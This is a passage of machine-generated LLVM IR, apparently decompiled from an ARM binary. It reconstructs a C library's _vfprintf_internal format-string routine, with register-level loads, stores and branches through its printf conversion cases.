  %v0_13f3c = phi i32 [ %v4_13f0c, %dec_label_pc_13f00 ], [ %v2_13f38, %bb15 ]
  store i32 %v0_13f3c, i32* %r0.global-to-local, align 4
  %v2_13f40 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13f40, i32* %r4.global-to-local, align 4
  store i32 %v6_13ec4, i32* %r5.global-to-local, align 4
  ret i32 %v0_13f3c

; uselistorder directives
  uselistorder i32 %v0_13f3c, { 1, 0 }
  uselistorder i32 %v0_13f1c, { 1, 0 }
  uselistorder i32 %v2_13eec, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_13f3c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_13f1c, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_2()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_2()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_13f48 = load i32, i32* @r5, align 4
  %v9_13f48 = load i32, i32* @r6, align 4
  %v12_13f48 = load i32, i32* @r7, align 4
  %v15_13f48 = load i32, i32* @r8, align 4
  %v18_13f48 = load i32, i32* @sb, align 4
  %v21_13f48 = load i32, i32* @sl, align 4
  %v24_13f48 = load i32, i32* @fp, align 4
  %v2_13f50 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_13f50, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_13f50, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_13f60 = load i32, i32* @r2, align 4
  store i32 %v0_13f60, i32* @r5, align 4
  %v2_13f64 = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_13f64, i32* %r0.global-to-local, align 4
  %v1_13f6c = icmp slt i32 %v2_13f64, 0
  br i1 %v1_13f6c, label %dec_label_pc_13f7c, label %dec_label_pc_13fb0

dec_label_pc_13f7c:                               ; preds = %entry
  %v3_13f7c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_13f7c, i32* @r4, align 4
  %v1_13f80 = inttoptr i32 %v3_13f7c to i8*
  store i32 %v3_13f7c, i32* %r0.global-to-local, align 4
  %v3_13f84 = call i32 @strlen(i8* %v1_13f80)
  store i32 %v3_13f84, i32* %r0.global-to-local, align 4
  %v2_13f88 = icmp eq i32 %v3_13f84, 0
  br i1 %v2_13f88, label %bb, label %dec_label_pc_13f98

bb:                                               ; preds = %dec_label_pc_13f7c
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14608

dec_label_pc_13f98:                               ; preds = %dec_label_pc_13f7c
  %v0_13f98 = load i32, i32* @r4, align 4
  store i32 %v0_13f98, i32* %r0.global-to-local, align 4
  %v0_13f9c = load i32, i32* @fp, align 4
  store i32 %v0_13f9c, i32* %r2.global-to-local, align 4
  %v3_13fa0 = inttoptr i32 %v0_13f9c to i16*
  %v4_13fa0 = call i32 @__stdio_fwrite(i32 %v0_13f98, i32 %v3_13f84, i16* %v3_13fa0)
  store i32 %v4_13fa0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14608

dec_label_pc_13fb0:                               ; preds = %entry
  %v0_13fb0 = load i32, i32* @r5, align 4
  store i32 %v2_13f50, i32* %r0.global-to-local, align 4
  %v2_13fb8 = call i32 @_ppfs_prepargs(i32 %v2_13f50, i32 %v0_13fb0)
  store i32 %v2_13fb8, i32* %r0.global-to-local, align 4
  %v0_14000 = load i32, i32* @r4, align 4
  store i32 %v0_14000, i32* %r2.global-to-local, align 4
  %v1_14084 = bitcast i32* %stack_var_-352 to i8*
  %v4_14094 = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_140a0 = ptrtoint i32* %stack_var_-272 to i32
  %v2_140b8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_140d4 = icmp eq i32 %tmp104, 0
  %v2_14418 = ptrtoint i32* %stack_var_-200 to i32
  %v2_14458 = ptrtoint i32* %stack_var_-348 to i32
  %v2_1445c = ptrtoint i32* %stack_var_-72 to i32
  %v2_14308 = ptrtoint i32* %stack_var_-44 to i32
  %v2_14314 = ptrtoint i32* %stack_var_-52 to i32
  %v7_14170 = zext i8 %tmp102 to i32
  %v2_141a8 = ptrtoint i32* %stack_var_-73 to i32
  %v1_141b0 = bitcast i32* %stack_var_-73 to i8*
  %v2_141b8 = icmp ugt i32 %tmp104, 4
  %v7_141b8 = icmp eq i32 %tmp104, 5
  %v7_1409c = ptrtoint i32* %stack_var_-280 to i32
  %v5_140cc195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_142dc = icmp ugt i32 %tmp104, 16
  %v7_142dc = icmp eq i32 %tmp104, 17
  %v2_142e0 = xor i1 %v7_142dc, true
  %v3_142e0 = and i1 %v2_142dc, %v2_142e0
  %v2_14364 = icmp ugt i32 %tmp104, 18
  %v7_14364 = icmp eq i32 %tmp104, 19
  %v2_14368 = xor i1 %v7_14364, true
  %v3_14368 = and i1 %v2_14364, %v2_14368
  %v7_14400 = icmp eq i32 %tmp104, 20
  %v1_14118 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37045)
  %v2_14118 = inttoptr i32 %v1_14118 to i8*
  %v2_14144 = xor i1 %v7_141b8, true
  %v3_14144 = and i1 %v2_141b8, %v2_14144
  %v7_14178 = icmp eq i32 %tmp104, 1
  %v2_141c0 = xor i1 %v2_141b8, true
  %v3_141c0 = or i1 %v7_141b8, %v2_141c0
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_14228 = icmp eq i32 %tmp104, 3
  %v11_14234 = icmp eq i32 %tmp104, 4
  %v9_140a4 = mul nuw nsw i32 %v4_14094, 8
  %v10_140a4 = add i32 %v7_1409c, %v9_140a4
  br label %dec_label_pc_14004.outer

dec_label_pc_14004.outer:                         ; preds = %dec_label_pc_145ec, %dec_label_pc_13fb0
  %v0_1400445 = phi i32 [ %v3_145ec, %dec_label_pc_145ec ], [ %v0_14000, %dec_label_pc_13fb0 ]
  %v0_14138 = phi i32 [ %stack_var_-336.4, %dec_label_pc_145ec ], [ %tmp103, %dec_label_pc_13fb0 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_145ec ], [ 0, %dec_label_pc_13fb0 ]
  br label %dec_label_pc_14004.outer36

dec_label_pc_14004.outer36:                       ; preds = %dec_label_pc_14004.outer, %dec_label_pc_145f8
  %v0_1400444 = phi i32 [ %v0_1400445, %dec_label_pc_14004.outer ], [ %v1_145f8, %dec_label_pc_145f8 ]
  %v5_14030 = phi i32 [ %v0_1400445, %dec_label_pc_14004.outer ], [ %v1_14060, %dec_label_pc_145f8 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_14004.outer ], [ %v1_144d8, %dec_label_pc_145f8 ]
  %v1_14004188 = inttoptr i32 %v0_1400444 to i8*
  %v2_14004189 = load i8, i8* %v1_14004188, align 1
  %v2_14008191 = icmp eq i8 %v2_14004189, 0
  br i1 %v2_14008191, label %dec_label_pc_14020, label %bb138

bb138:                                            ; preds = %dec_label_pc_14004.outer36, %.thread6
  %v2_14004193 = phi i8 [ %v2_14004, %.thread6 ], [ %v2_14004189, %dec_label_pc_14004.outer36 ]
  %v1_14018192 = phi i32 [ %v2_14018, %.thread6 ], [ %v0_1400444, %dec_label_pc_14004.outer36 ]
  %v8_1400c = icmp eq i8 %v2_14004193, 37
  br i1 %v8_1400c, label %dec_label_pc_14020, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_14018 = add i32 %v1_14018192, 1
  store i32 %v2_14018, i32* @r4, align 4
  %v1_14004 = inttoptr i32 %v2_14018 to i8*
  %v2_14004 = load i8, i8* %v1_14004, align 1
  %v2_14008 = icmp eq i8 %v2_14004, 0
  br i1 %v2_14008, label %dec_label_pc_14020, label %bb138

dec_label_pc_14020:                               ; preds = %bb138, %.thread6, %dec_label_pc_14004.outer36
  %v1_14018.lcssa = phi i32 [ %v0_1400444, %dec_label_pc_14004.outer36 ], [ %v2_14018, %.thread6 ], [ %v1_14018192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_14020 = sub i32 %v1_14018.lcssa, %v5_14030
  %v9_14020 = icmp eq i32 %v1_14018.lcssa, %v5_14030
  br i1 %v9_14020, label %dec_label_pc_14054, label %dec_label_pc_14028

dec_label_pc_14028:                               ; preds = %dec_label_pc_14020
  store i32 %v2_14020, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_14020, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_14028
  store i32 %v5_14030, i32* %r0.global-to-local, align 4
  %v5_14038 = load i32, i32* @fp, align 4
  store i32 %v5_14038, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_14028, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_14028 ]
  store i32 81984, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_15740.527 to i32))
  %v0_14040 = load i32, i32* %r0.global-to-local, align 4
  %v1_14040 = load i32, i32* @r5, align 4
  %v9_14040 = icmp eq i32 %v0_14040, %v1_14040
  br i1 %v9_14040, label %dec_label_pc_14048, label %dec_label_pc_14600

dec_label_pc_14048:                               ; preds = %bb142
  %v2_1404c = add i32 %v0_14040, %stack_var_-356.1.ph37
  %v0_14054.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14054

dec_label_pc_14054:                               ; preds = %dec_label_pc_14020, %dec_label_pc_14048
  %v0_14068 = phi i32 [ %v5_14030, %dec_label_pc_14020 ], [ %v0_14054.pre, %dec_label_pc_14048 ]
  %v1_144d8 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_14020 ], [ %v2_1404c, %dec_label_pc_14048 ]
  %v1_14054 = inttoptr i32 %v0_14068 to i8*
  %v2_14054 = load i8, i8* %v1_14054, align 1
  %v2_14058 = icmp eq i8 %v2_14054, 0
  br i1 %v2_14058, label %dec_label_pc_14608, label %dec_label_pc_14060

dec_label_pc_14060:                               ; preds = %dec_label_pc_14054
  %v1_14060 = add i32 %v0_14068, 1
  %v2_14060 = inttoptr i32 %v1_14060 to i8*
  %v3_14060 = load i8, i8* %v2_14060, align 1
  %v7_14064 = icmp eq i8 %v3_14060, 37
  store i32 %v1_14060, i32* %r2.global-to-local, align 4
  br i1 %v7_14064, label %dec_label_pc_145f8, label %dec_label_pc_14070

dec_label_pc_14070:                               ; preds = %dec_label_pc_14060
  store i32 %v2_13f50, i32* @r4, align 4
  store i32 %v2_13f50, i32* %r0.global-to-local, align 4
  store i32 %v1_14060, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_14084 = call i32 @_ppfs_parsespec(i8* %v1_14084)
  store i32 %v2_13f50, i32* @r0, align 4
  %v0_1408c = call i32 @_ppfs_setargs()
  store i32 %v0_1408c, i32* %r0.global-to-local, align 4
  store i32 %v4_14094, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_14070
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_14070, %bb145
  %storemerge = phi i32 [ %v10_140a4, %bb145 ], [ %v7_140a0, %dec_label_pc_14070 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_140cc195, label %dec_label_pc_140b0, label %dec_label_pc_140d0

dec_label_pc_140b0:                               ; preds = %bb146, %dec_label_pc_140b0
  %v5_140bc197 = phi i32 [ %v5_140bc, %dec_label_pc_140b0 ], [ %v2_140b8, %bb146 ]
  %v0_140b0196 = phi i32 [ %v1_140b4, %dec_label_pc_140b0 ], [ %storemerge, %bb146 ]
  %v2_140b0 = add i32 %v5_140bc197, -32
  %v3_140b0 = inttoptr i32 %v2_140b0 to i32*
  store i32 %v0_140b0196, i32* %v3_140b0, align 4
  %v0_140b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_140b4 = add i32 %v0_140b4, 8
  store i32 %v1_140b4, i32* %r0.global-to-local, align 4
  %v1_140bc.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_140bc = mul i32 %v1_140bc.pre, 4
  %v5_140bc = add i32 %v4_140bc, %v2_140b8
  %v1_140c8 = add i32 %v1_140bc.pre, 1
  store i32 %v1_140c8, i32* %r2.global-to-local, align 4
  %v5_140cc = icmp slt i32 %v1_140bc.pre, %tmp105
  br i1 %v5_140cc, label %dec_label_pc_140b0, label %dec_label_pc_140d0

dec_label_pc_140d0:                               ; preds = %dec_label_pc_140b0, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_140d4, label %dec_label_pc_140dc, label %dec_label_pc_14100

dec_label_pc_140dc:                               ; preds = %dec_label_pc_140d0
  %v3_140dc = load i32, i32* %stack_var_-72, align 4
  %v1_140e8 = inttoptr i32 %v3_140dc to i32*
  %v2_140e8 = load i32, i32* %v1_140e8, align 4
  store i32 %v2_140e8, i32* %r0.global-to-local, align 4
  %v1_140ec = and i32 %v0_14138, 3840
  store i32 %v1_144d8, i32* %r2.global-to-local, align 4
  %v3_140f4 = ashr i32 %v1_144d8, 31
  %v4_140f8 = inttoptr i32 %v2_140e8 to i16*
  %v5_140f8 = call i32 @_store_inttype(i16* %v4_140f8, i32 %v1_140ec, i32 %v1_144d8, i32 %v3_140f4)
  store i32 %v5_140f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_145ec

dec_label_pc_14100:                               ; preds = %dec_label_pc_140d0
  br i1 %tmp207, label %dec_label_pc_1429c, label %dec_label_pc_14108

dec_label_pc_14108:                               ; preds = %dec_label_pc_14100
  %v3_14118 = load i8, i8* %v2_14118, align 1
  %v4_14118 = zext i8 %v3_14118 to i32
  %v7_1411c = icmp eq i8 %v3_14118, 10
  br i1 %v7_1411c, label %dec_label_pc_14128, label %bb147

bb147:                                            ; preds = %dec_label_pc_14108
  br label %bb151

dec_label_pc_14128:                               ; preds = %dec_label_pc_14108
  %v1_14138 = and i32 %v0_14138, 64
  %v2_14138 = icmp eq i32 %v1_14138, 0
  br i1 %v2_14138, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_14128
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_14128, %bb150
  br i1 %v3_14144, label %.thread, label %dec_label_pc_1414c

.thread:                                          ; preds = %bb151
  %v5_14144 = sub nsw i32 0, %v4_14118
  br label %dec_label_pc_14164

dec_label_pc_1414c:                               ; preds = %bb151
  br i1 %v7_14228, label %bb152, label %dec_label_pc_14158

bb152:                                            ; preds = %dec_label_pc_1414c
  br label %dec_label_pc_14164

dec_label_pc_14158:                               ; preds = %dec_label_pc_1414c
  br i1 %v7_14178, label %dec_label_pc_14168, label %dec_label_pc_14164

dec_label_pc_14164:                               ; preds = %.thread, %bb152, %dec_label_pc_14158
  %v0_1419081 = phi i32 [ %v5_14144, %.thread ], [ %v4_14118, %bb152 ], [ %v4_14118, %dec_label_pc_14158 ]
  br label %dec_label_pc_14168

dec_label_pc_14168:                               ; preds = %dec_label_pc_14158, %dec_label_pc_14164
  %v0_1419080 = phi i32 [ %v0_1419081, %dec_label_pc_14164 ], [ %v4_14118, %dec_label_pc_14158 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_14164 ], [ 6, %dec_label_pc_14158 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_14168 = load i32, i32* %stack_var_-348, align 4
  %v1_1416c = icmp slt i32 %v3_14168, 0
  %v7_14170. = select i1 %v1_1416c, i32 %v7_14170, i32 32
  store i32 %v7_14170., i32* @sb, align 4
  br i1 %v7_14178, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_14168
  store i32 %v2_140b8, i32* %r2.global-to-local, align 4
  %v2_14180 = load i32, i32* @ip, align 4
  %v5_14180 = mul i32 %v2_14180, 4
  %v6_14180 = add i32 %v5_14180, %v2_140b8
  %v2_14184 = add i32 %v6_14180, -276
  %v3_14184 = inttoptr i32 %v2_14184 to i32*
  %v4_14184 = load i32, i32* %v3_14184, align 4
  %v2_1418c = and i32 %v4_14184, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_14168, %.thread15
  %storemerge93 = phi i32 [ %v2_1418c, %.thread15 ], [ 1024, %dec_label_pc_14168 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_1419080, i32* @r2, align 4
  %v3_14194 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_14194, i32* @r1, align 4
  %v0_14198 = call i32 @_load_inttype()
  store i32 %v0_14198, i32* @r2, align 4
  %v0_141a4 = load i32, i32* @r1, align 4
  store i32 %v0_141a4, i32* @r3, align 4
  store i32 %v2_141a8, i32* %r0.global-to-local, align 4
  %v2_141b0 = call i32 @_uintmaxtostr(i8* %v1_141b0)
  store i32 %v2_141b0, i32* %r0.global-to-local, align 4
  store i32 %v2_141b0, i32* @r4, align 4
  br i1 %v3_141c0, label %bb160, label %dec_label_pc_141c4

dec_label_pc_141c4:                               ; preds = %bb157
  %v3_141b0 = inttoptr i32 %v2_141b0 to i8*
  %v3_141c4 = load i8, i8* %v3_141b0, align 1
  %v7_141c8 = icmp eq i8 %v3_141c4, 45
  %v2_141d0 = or i32 %v0_14138, 2
  %v2_141d0.stack_var_-336.0 = select i1 %v7_141c8, i32 %v2_141d0, i32 %v0_14138
  br i1 %v7_141c8, label %.thread17, label %dec_label_pc_141e4

.thread17:                                        ; preds = %dec_label_pc_141c4
  %v3_141d4 = add i32 %v2_141b0, 1
  store i32 %v3_141d4, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_141e4:                               ; preds = %dec_label_pc_141c4
  %v1_141e4 = and i32 %v2_141d0.stack_var_-336.0, 2
  %v2_141e4 = icmp eq i32 %v1_141e4, 0
  br i1 %v2_141e4, label %dec_label_pc_141f0, label %bb158

bb158:                                            ; preds = %dec_label_pc_141e4
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_141f0:                               ; preds = %dec_label_pc_141e4
  %v1_141f0 = urem i32 %v2_141d0.stack_var_-336.0, 2
  %v2_141f0 = icmp eq i32 %v1_141f0, 0
  br i1 %v2_141f0, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_141f0
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_141f0, %bb159
  %v0_1424c = phi i32 [ %v2_141b0, %bb157 ], [ %v3_141d4, %.thread17 ], [ %v2_141b0, %dec_label_pc_141f0 ], [ %v2_141b0, %bb159 ], [ %v2_141b0, %bb158 ]
  %v0_14208 = phi i32 [ %v0_14138, %bb157 ], [ %v2_141d0, %.thread17 ], [ %v0_14138, %dec_label_pc_141f0 ], [ %v0_14138, %bb159 ], [ %v0_14138, %bb158 ]
  %v3_141f8 = load i32, i32* %stack_var_-348, align 4
  %v1_14200 = icmp slt i32 %v3_141f8, 0
  br i1 %v1_14200, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
  %storemerge206 = phi i32 [ 1, %bb161 ], [ %v3_141f8, %bb160 ]
  %v0_14230 = phi i32 [ 1, %bb161 ], [ %v3_141f8, %bb160 ]
  store i32 %storemerge206, i32* %r2.global-to-local, align 4
  %v1_14208 = and i32 %v0_14208, 16
  %v2_14208 = icmp eq i32 %v1_14208, 0
  %v2_14214 = sub i32 %v2_141a8, %v0_1424c
  store i32 %v2_14214, i32* @r5, align 4
  br i1 %v2_14208, label %bb169, label %dec_label_pc_1421c

dec_label_pc_1421c:                               ; preds = %bb162
  br i1 %tmp209, label %bb163, label %bb164

bb163:                                            ; preds = %dec_label_pc_1421c
  store i32 6, i32* @r6, align 4
  br label %bb164

bb164:                                            ; preds = %dec_label_pc_1421c, %bb163
  br i1 %v7_14228, label %bb165, label %bb166

bb165:                                            ; preds = %bb164
  store i32 9, i32* @r6, align 4
  br label %bb166

bb166:                                            ; preds = %bb164, %bb165
  %tmp210 = icmp ugt i32 %v0_14230, %v2_14214
  br i1 %tmp210, label %bb169, label %bb167

bb167:                                            ; preds = %bb166
  br i1 %v11_14234, label %dec_label_pc_1423c, label %bb169

dec_label_pc_1423c:                               ; preds = %bb167
  %v1_1423c = inttoptr i32 %v0_1424c to i8*
  %v2_1423c = load i8, i8* %v1_1423c, align 1
  %v7_14240 = icmp eq i8 %v2_1423c, 48
  br i1 %v7_14240, label %bb168, label %.thread24

bb168:                                            ; preds = %dec_label_pc_1423c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb169

.thread24:                                        ; preds = %dec_label_pc_1423c
  %v2_14248 = add i32 %v2_14214, 1
  store i32 %v2_14248, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %bb166, %bb168, %bb167, %bb162, %.thread24
  %v5_1428c = phi i32 [ %v0_14230, %bb167 ], [ %v0_14230, %bb162 ], [ 1, %bb168 ], [ %v2_14248, %.thread24 ], [ %v0_14230, %bb166 ]
  %v1_1424c = inttoptr i32 %v0_1424c to i8*
  %v2_1424c = load i8, i8* %v1_1424c, align 1
  %v7_14250 = icmp eq i8 %v2_1424c, 48
  br i1 %v7_14250, label %dec_label_pc_14258, label %dec_label_pc_14288

dec_label_pc_14258:                               ; preds = %bb169
  %v0_1425c = load i32, i32* @r6, align 4
  %v7_14260 = icmp slt i32 %v0_1425c, 6
  br i1 %v7_14260, label %bb171, label %bb170

bb170:                                            ; preds = %dec_label_pc_14258
  store i32 11, i32* @r6, align 4
  br label %bb171

bb171:                                            ; preds = %dec_label_pc_14258, %bb170
  br i1 %v7_14178, label %.thread27, label %dec_label_pc_1427c

.thread27:                                        ; preds = %bb171
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @ip, align 4
  store i32 5, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37072), i32* @r4, align 4
  br label %dec_label_pc_14294

dec_label_pc_1427c:                               ; preds = %bb171
  %v2_1427c = icmp eq i32 %v5_1428c, 0
  br i1 %v2_1427c, label %bb172, label %dec_label_pc_14288

bb172:                                            ; preds = %dec_label_pc_1427c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_14294

dec_label_pc_14288:                               ; preds = %dec_label_pc_1427c, %bb169
  %v2_14288 = sub i32 %v5_1428c, %v2_14214
  %tmp211 = icmp ugt i32 %v5_1428c, %v2_14214
  br i1 %tmp211, label %.thread85, label %dec_label_pc_14294

.thread85:                                        ; preds = %dec_label_pc_14288
  store i32 %v2_14288, i32* @r8, align 4
  br label %dec_label_pc_144a8thread-pre-split

dec_label_pc_14294:                               ; preds = %dec_label_pc_14288, %.thread27, %bb172
  %v1_144ac.pre205 = phi i32 [ %v2_14214, %dec_label_pc_14288 ], [ 5, %.thread27 ], [ 0, %bb172 ]
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_144a8thread-pre-split

dec_label_pc_1429c:                               ; preds = %dec_label_pc_14100
  br i1 %tmp208, label %dec_label_pc_142dc, label %dec_label_pc_142a4

dec_label_pc_142a4:                               ; preds = %dec_label_pc_1429c
  %v3_142b4 = load i32, i32* %stack_var_-72, align 4
  %v0_142b8 = load i32, i32* @fp, align 4
  store i32 %v0_142b8, i32* %r0.global-to-local, align 4
  %v1_142bc = inttoptr i32 %v3_142b4 to i32*
  %v2_142bc = load i32, i32* %v1_142bc, align 4
  store i32 %v2_142bc, i32* %r2.global-to-local, align 4
  %v3_142bc = add i32 %v3_142b4, 4
  %v4_142bc = inttoptr i32 %v3_142bc to i32*
  %v5_142bc = load i32, i32* %v4_142bc, align 4
  %v8_142c0 = call i32 @_fpmaxtostr(i32 %v0_142b8, double bitcast (i64 sext (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -58316) to i64) to double), i32 %v2_142bc, i32 %v5_142bc, i32 %v2_14458, i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -58316))
  store i32 %v8_142c0, i32* %r0.global-to-local, align 4
  %v1_142c4 = icmp slt i32 %v8_142c0, 0
  br i1 %v1_142c4, label %dec_label_pc_14600, label %dec_label_pc_142cc

dec_label_pc_142cc:                               ; preds = %dec_label_pc_142a4
  %v2_142d0 = add i32 %v8_142c0, %v1_144d8
  store i32 %v2_142d0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_145ec

dec_label_pc_142dc:                               ; preds = %dec_label_pc_1429c
  br i1 %v3_142e0, label %dec_label_pc_14364, label %dec_label_pc_142e4

dec_label_pc_142e4:                               ; preds = %dec_label_pc_142dc
  store i32 0, i32* @sl, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_142ec = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_142ec, i32* %r0.global-to-local, align 4
  br i1 %v7_142dc, label %dec_label_pc_142f4, label %dec_label_pc_1432c

dec_label_pc_142f4:                               ; preds = %dec_label_pc_142e4
  %v1_142f4 = inttoptr i32 %v3_142ec to i32*
  %v2_142f4 = load i32, i32* %v1_142f4, align 4
  %v9_142f8 = icmp eq i32 %v2_142f4, 0
  store i32 %v2_142f4, i32* %stack_var_-44, align 4
  br i1 %v9_142f8, label %dec_label_pc_143a4, label %dec_label_pc_14304

dec_label_pc_14304:                               ; preds = %dec_label_pc_142f4
  %v3_14304 = load i32, i32* %stack_var_-348, align 4
  store i32 %v2_14308, i32* @r0, align 4
  %v4_1430c = ashr i32 %v3_14304, 31
  %v5_1430c = or i32 %v4_1430c, %v3_14304
  store i32 %v5_1430c, i32* %r2.global-to-local, align 4
  store i32 %v2_14308, i32* @r1, align 4
  %v6_14318 = call i32 @__GI_wcsrtombs(i32 %v2_14308, i32 %v2_14308, i32 %v5_1430c, i32 %v2_14314, i32 0, i32 %v2_142f4)
  store i32 %v6_14318, i32* %r0.global-to-local, align 4
  %v3_1431c = icmp eq i32 %v6_14318, -1
  store i32 %v6_14318, i32* @r5, align 4
  br i1 %v3_1431c, label %dec_label_pc_14600, label %dec_label_pc_14498

dec_label_pc_1432c:                               ; preds = %dec_label_pc_142e4
  store i32 %v2_14418, i32* %r7.global-to-local, align 4
  %v1_14330 = inttoptr i32 %v3_142ec to i32*
  %v2_14330 = load i32, i32* %v1_14330, align 4
  store i32 %v2_14314, i32* %r2.global-to-local, align 4
  store i32 %v2_14418, i32* %r0.global-to-local, align 4
  %v5_1433c = call i32 @__GI_wcrtomb(i32 %v2_14418, i32 %v2_14330, i32 %v2_14314, i32 %tmp105, i32 0)
  store i32 %v5_1433c, i32* %r0.global-to-local, align 4
  %v7_14340 = icmp eq i32 %v5_1433c, -1
  store i32 %v5_1433c, i32* @r5, align 4
  br i1 %v7_14340, label %dec_label_pc_14600, label %dec_label_pc_1434c

dec_label_pc_1434c:                               ; preds = %dec_label_pc_1432c
  %v0_1434c = load i32, i32* @sl, align 4
  store i32 %v0_1434c, i32* @r8, align 4
  store i32 %v2_14418, i32* @r4, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  %v1_1435c = trunc i32 %v0_1434c to i8
  %v2_1435c = load i32, i32* %r7.global-to-local, align 4
  %v4_1435c = add i32 %v2_1435c, %v5_1433c
  %v5_1435c = inttoptr i32 %v4_1435c to i8*
  store i8 %v1_1435c, i8* %v5_1435c, align 1
  %v0_144ac.pre.pre = load i32, i32* @r8, align 4
  %v1_144ac.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_144a8thread-pre-split

dec_label_pc_14364:                               ; preds = %dec_label_pc_142dc
  br i1 %v3_14368, label %dec_label_pc_14400, label %dec_label_pc_1436c

dec_label_pc_1436c:                               ; preds = %dec_label_pc_14364
  %v3_1436c = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_1436c, i32* %r0.global-to-local, align 4
  %v1_14374 = inttoptr i32 %v3_1436c to i32*
  %v2_14374 = load i32, i32* %v1_14374, align 4
  br i1 %v7_14364, label %dec_label_pc_14374, label %dec_label_pc_143d8

dec_label_pc_14374:                               ; preds = %dec_label_pc_1436c
  store i32 %v2_14374, i32* @r4, align 4
  %v2_14378 = icmp eq i32 %v2_14374, 0
